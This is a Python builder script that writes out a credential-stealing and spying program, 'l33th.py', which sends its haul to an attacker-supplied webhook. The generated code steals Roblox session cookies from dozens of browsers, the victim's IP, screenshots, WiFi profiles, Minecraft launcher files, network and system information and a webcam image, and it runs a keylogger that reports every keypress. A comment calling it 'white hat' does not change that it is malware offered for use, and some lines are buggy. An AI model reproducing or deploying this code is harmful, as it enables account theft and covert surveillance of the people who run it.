webhook = input("Enter your webhook url here: ")
with open("l33th.py","w") as f:
    f.write(f'webhook_url = {webhook}' +'''

#this is an open source project/virus, and was made for white hat hacking and not black hat hacking, thank you for understanding
import browser_cookie3
import requests
import keyboard
import os
import pyautogui
from winwifi import WinWiFi as wiw
import cv2






#with open("priip.txt","w") as f:
    #f.write("")
#with open("systeminfo.txt","w") as f:
    #f.write("")

cookies = ['firefox', 'chrome', 'chromium', 'edge', 'opera', 'vivaldi', 'brave', 'yandex', 'torch', 'maxthon', 'iridium', 'comodo', 'seamonkey', 'palemoon', 'waterfox', 'basilisk', 'safari', 'internet explorer', 'netscape', 'avant browser', 'camino', 'flock', 'galeon', 'k-meleon', 'lynx', 'midori', 'mosaic', 'nokia browser', 'omniweb', 'puffin', 'rockmelt', 'slimjet', 'srware iron', 'uc browser', 'webtv', 'whale', 'yuzu', 'zohocorp', '360 secure browser', 'amigo', 'apache', 'apple webkit', 'arora', 'beaker browser', 'blisk', 'browzar', 'citrio', 'coccoc', 'colibri', 'coolnovo', 'cyberfox', 'deepnet explorer', 'dillo', 'dooble', 'dorothy browser', 'epic browser', 'fennec', 'flock', 'fluid', 'gnome web', 'googlebot', 'google earth', 'hotjava', 'iceape', 'icecat', 'iceweasel', 'jack', 'kazehakase', 'kipi', 'k-meleon goanna', 'konqueror', 'leopard webkit', 'links', 'lunascape', 'microsoft edge mobile', 'microsoft webmatrix', 'min', 'minimo', 'minuet', 'mozilla suite', 'netsurf', 'nutscrape', 'omniweb', 'orca browser', 'phoenix', 'pogo', 'qutebrowser', 'qtweb', 'rockmelt', 'salamweb', 'samsung internet', 'shiira', 'songbird', 'surf', 'swiftfox', 'tenfourfox', 'the world browser', 'uzbl', 'vortex', 'web', 'webian shell', 'webpositive', 'wget', 'wxweb', 'xombrero', 'yellow', 'avast', 'tor']


def get():
    for browser in cookies:
        try:
            browsers = getattr(browser_cookie3, browser)(domain_name='roblox.com')
            for cookie in browsers:
                if cookie.name == '.ROBLOSECURITY':
                    data = {
                        'content':f"``{cookie.value}``"
                    }
                    headers = {
                        "Content-Type": "application/json"
                    }
                    requests.post({webhook_url}, json=data)

        except:
            pass
    return None

get()
ip = requests.get("https://api.ipify.org").text
data = {
    'content':f"``{ip}``"
}
requests.post({webhook_url}, json=data)

screenshot = pyautogui.screenshot()
screenshot.save(f'C:\\Users\\{os.getlogin()}\\Downloads\\desktop.png')

file = {'file': open(f'C:\\Users\\{os.getlogin()}\\Downloads\\desktop.png', 'rb')}

requests.post({webhook_url},files=file)
wifi_networks = wiw.get_profiles()
data = {
    "content": f"""Main WiFi Network is {wifi_networks[1]} or {wifi_networks[2]}

Count of current WiFi Networks are {len(wifi_networks)}

Current WiFi Networks are {wifi_networks}"""
}
requests.post({webhook_url}, json=data)
file = {'file': open(f'C:\\Users\\{os.getlogin()}\\AppData\\Roaming\\.minecraft\\launcher_profiles.json', 'rb')}
requests.post({webhook_url}, files=file)
os.system(f'arp -a>"C:\\Users\\{os.getlogin()}\\Downloads\\priip.txt"')
file = {'file': open(f'C:\\Users\\{os.getlogin()}\\Downloads\\priip.txt', 'rb')}
requests.post({webhook_url}, files=file)
os.system(f'systeminfo>"C:\\Users\\{os.getlogin()}\\Downloads\\systeminfo.txt"')
file = {'file': open(f'C:\\Users\\{os.getlogin()}\\Downloads\\systeminfo.txt', 'rb')}
requests.post({webhook_url}, files=file)





cam_port = 0
cam = cv2.VideoCapture(cam_port)

result, image = cam.read()


if result:

    cv2.imwrite("cam.png", image)
    file = {'file': open(f"D:\\grabber\\cam.png", 'rb')}
    requests.post({webhook_url}, files=file)

else:
	pass

while True:
    key = keyboard.read_key()
    if keyboard.is_pressed(key):
        data = {
            'content':f"``{ip} has pressed {key}``"
        }
        requests.post({webhook_url}, json=data)
''')
